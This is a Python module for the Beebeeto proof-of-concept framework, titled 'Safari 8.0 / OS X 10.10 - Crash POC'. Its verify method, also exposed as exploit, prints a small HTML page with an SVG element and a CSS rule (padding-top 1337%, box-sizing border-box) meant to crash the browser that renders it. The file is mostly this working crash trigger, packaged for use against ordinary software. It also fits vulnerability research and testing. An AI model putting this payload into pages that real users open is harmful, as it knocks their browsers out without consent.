#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""


from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0146',
            'name': 'Safari 8.0 / OS X 10.10 - Crash POC',
            'author': '雷蜂',
            'create_date': '2014-11-18',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [10000],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'Safari',
            'vul_version': ['8.0'],
            'type': 'Other',
            'tag': ['Safari漏洞', 'Crash PoC'],
            'desc': 'N/A',
            'references': ['http://1337day.com/exploit/22884',
            ],
        },
    }


    @classmethod
    def verify(cls, args):
        verify_url = args['options']['target']
        if args['options']['verbose']:
            print '[*] Generation'
        temp = '''
        <!DOCTYPE html>
        <head>
            <style>
                svg {
                    padding-top: 1337%;
                    box-sizing: border-box;
                }
            </style>
        </head>
        <body>
            <svg viewBox="0 0 500 500" width="500" height="500">
                <polyline points="1 1,2 2"></polyline>
            </svg>
        </body>
        </html>
        '''
        print '[*] Copy code: ' + temp
        args['poc_ret']['vul_url'] = 'Generation ok'
        return args

    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())